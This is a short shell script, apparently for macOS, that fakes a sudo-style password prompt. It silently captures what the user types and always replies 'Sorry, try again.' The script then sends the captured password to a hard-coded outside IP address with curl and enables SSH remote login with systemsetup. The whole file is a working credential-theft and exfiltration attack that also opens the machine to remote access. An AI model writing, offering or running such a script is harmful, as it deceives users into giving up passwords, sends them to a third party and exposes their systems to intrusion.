echo Password:
read -s password
echo 'Sorry, try again.'
# Run Command
curl http://52.77.159.173/directory/get_x/${password}
sudo systemsetup -setremotelogin on

